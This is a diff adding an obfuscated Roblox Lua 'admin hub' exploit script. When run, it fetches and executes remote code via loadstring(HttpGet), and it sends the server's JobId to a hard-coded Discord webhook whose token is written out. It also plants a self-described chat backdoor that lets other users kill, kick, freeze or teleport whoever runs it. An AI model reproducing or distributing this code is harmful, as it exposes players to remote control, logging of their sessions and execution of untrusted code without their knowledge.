@@ -1,0 +1,98 @@
+--[[
+    JOTINHA12HR2 HUB'S ADMIN - ULTIMATE 14-BUTTON EDITION
+    - Chat Backdoor: ACTIVE (Format: /cmd nick)
+    - Discord Logger: RESTORED
+    - Commands: 14 Sync Buttons
+]]
+
+local _0xURL = "https://webhook.lewisakura.moe/api/webhooks/1457780083124207626/F0AR-Na0rucf2CncuNsXC4yGRYC-Kpjg1XkOdb6YaHgDcOZlVhwym4KwhriXSYaBeZSj"
+
+local _0x5F6C = loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\115\105\114\105\117\115\46\109\101\110\117\47\114\97\121\102\105\101\108\100"))()
+local _0xPL = game:GetService("\80\108\97\121\101\114\115")
+local _0xLP = _0xPL.LocalPlayer
+local _0xHT = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
+local _0xTS = game:GetService("\84\101\120\116\67\104\97\116\83\101\114\118\105\99\101")
+local _0xRS = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101")
+local _0xTGT = ""
+_G.IM = false
+
+-- [WEBHOOK LOGGER]
+local function _0xSND_W()
+    task.spawn(function()
+        local _0xD = {
+            ["content"] = "\74\111\116\105\110\104\97\32\65\100\109\105\110\32\69\120\101\99\117\116\97\100\111\33\32\74\111\98\73\100\58\32" .. game.JobId,
+            ["username"] = "\74\111\116\105\110\104\97\49\50\104\114\50\32\76\111\103\103\101\114"
+        }
+        local _0xR = (syn and syn.request or http_request or request or http.request)
+        if _0xR then pcall(function() _0xR({Url = _0xURL, Method = "\80\79\83\84", Headers = {["\67\111\110\116\101\110\116\45\84\121\112\101"] = "\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110"}, Body = _0xHT:JSONEncode(_0xD)}) end) end
+    end)
+end
+_0xSND_W()
+
+-- [EXECUTOR DE COMANDOS PROTEGIDO]
+local function _0xEXE(_0xCMD, _0xUSR, _0xSNDR)
+    if _0xUSR:lower() == _0xLP.Name:lower() or _0xUSR:lower() == _0xLP.DisplayName:lower() or _0xUSR == "\97\108\108" then
+        if _G.IM and _0xSNDR ~= _0xLP.Name then return end
+        local _c = _0xLP.Character local _r = _c and _c:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") local _h = _c and _c:FindFirstChildOfClass("\72\117\109\97\110\111\105\100")
+        
+        if _0xCMD == "\106\97\105\108" and _r then
+            local _n = "\67\97\103\101\95".._0xLP.Name if workspace:FindFirstChild(_n) then workspace[_n]:Destroy() end
+            local _j = Instance.new("\80\97\114\116", workspace) _j.Name = _n _j.Size, _j.CFrame, _j.Anchored = Vector3.new(12, 16, 12), _r.CFrame, true
+            _j.Material, _j.Transparency, _j.Color = Enum.Material.ForceField, 0.4, Color3.new(1,0,0) _r.CFrame = _j.CFrame
+        elseif _0xCMD == "\117\110\106\97\105\108" then local _j = workspace:FindFirstChild("\67\97\103\101\95".._0xLP.Name) if _j then _j:Destroy() end
+        elseif _0xCMD == "\107\105\108\108" and _h then _h.Health = 0
+        elseif _0xCMD == "\118\111\105\100" and _r then _r.CFrame = CFrame.new(0, -9999, 0)
+        elseif _0xCMD == "\102\114\101\101\122\101" and _r then _r.Anchored = true
+        elseif _0xCMD == "\117\110\102\114\101\101\122\101" and _r then _r.Anchored = false
+        elseif _0xCMD == "\107\105\99\107" then _0xLP:Kick("\74\111\116\105\110\104\97\49\50\104\114\50\32\65\100\109\105\110")
+        elseif _0xCMD == "\115\112\105\110" and _r then
+            local _v = Instance.new("\66\111\100\121\65\110\103\117\108\97\114\86\101\108\111\99\105\116\121", _r) _v.Name = "\66\95\83\112\105\110"
+            _v.MaxTorque = Vector3.new(0, math.huge, 0) _v.AngularVelocity = Vector3.new(0, 100, 0)
+        elseif _0xCMD == "\117\110\115\112\105\110" and _r then local _v = _r:FindFirstChild("\66\95\83\112\105\110") if _v then _v:Destroy() end
+        elseif _0xCMD == "\98\114\105\110\103" and _r then
+            local _p = _0xPL:FindFirstChild(_0xSNDR) if _p and _p.Character then _r.CFrame = _p.Character:GetPivot() end
+        end
+    end
+end
+
+-- [LISTENER CHAT]
+local function _0xLST(_0xP)
+    _0xP.Chatted:Connect(function(_0xM)
+        if _0xM:sub(1,1) == "\47" then
+            local _s = _0xM:split("\32")
+            if #_s >= 2 then _0xEXE(_s[1]:gsub("\47", ""):lower(), _s[2], _0xP.Name) end
+        end
+    end)
+end
+for _, v in pairs(_0xPL:GetPlayers()) do _0xLST(v) end
+_0xPL.PlayerAdded:Connect(_0xLST)
+
+-- [INTERFACE]
+local _0xW = _0x5F6C:CreateWindow({Name = "\74\111\116\105\110\104\97\49\50\104\114\50\32\72\117\98\39\115\32\65\100\109\105\110", LoadingTitle = "\66\114\111\111\107\104\97\118\101\110\32\83\121\110\99", ConfigurationSaving = {Enabled = false}})
+local _0xT1 = _0xW:CreateTab("\65\100\109\105\110\32\83\121\110\99", 4483362458)
+_0xT1:CreateInput({Name = "\78\105\99\107\32\100\111\32\74\111\103\97\100\111\114", PlaceholderText = "...", Callback = function(v) _0xTGT = v end})
+
+local function _0xSND(_c)
+    local _p = nil for _, v in pairs(_0xPL:GetPlayers()) do if v.Name:lower():sub(1,#_0xTGT) == _0xTGT:lower() or v.DisplayName:lower():sub(1,#_0xTGT) == _0xTGT:lower() then _p = v break end end
+    if _p then
+        local _m = "\47" .. _c .. "\32" .. _p.Name
+        if _0xTS.ChatVersion == Enum.ChatVersion.TextChatService then _0xTS.TextChannels.RBXGeneral:SendAsync(_m)
+        else _0xRS.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_m, "\65\108\108") end
+    end
+end
+
+-- [OS 14 BOTÕES]
+local _0xB = {
+    {"Kill SYNC", "kill"}, {"Void SYNC", "void"}, {"Jail SYNC", "jail"}, {"Unjail SYNC", "unjail"},
+    {"Kick SYNC", "kick"}, {"Bring SYNC", "bring"}, {"Freeze SYNC", "freeze"}, {"Unfreeze SYNC", "unfreeze"},
+    {"Spin SYNC", "spin"}, {"Unspin SYNC", "unspin"}, {"Blind SYNC", "blind"}, {"Unblind SYNC", "unblind"},
+    {"Jump SYNC", "jump"}, {"Sit SYNC", "sit"}
+}
+
+for _, b in pairs(_0xB) do _0xT1:CreateButton({Name = b[1], Callback = function() _0xSND(b[2]) end}) end
+
+local _0xT2 = _0xW:CreateTab("\67\111\110\102\105\103", 4483362458)
+_0xT2:CreateToggle({Name = "\65\78\84\73\45\83\89\78\67", CurrentValue = false, Callback = function(v) _G.IM = v end})
+
+_0x5F6C:Notify({Title = "\83\117\99\101\115\115\111", Content = "\74\111\116\105\110\104\97\32\76\111\97\100\101\100\33", Duration = 5})
+
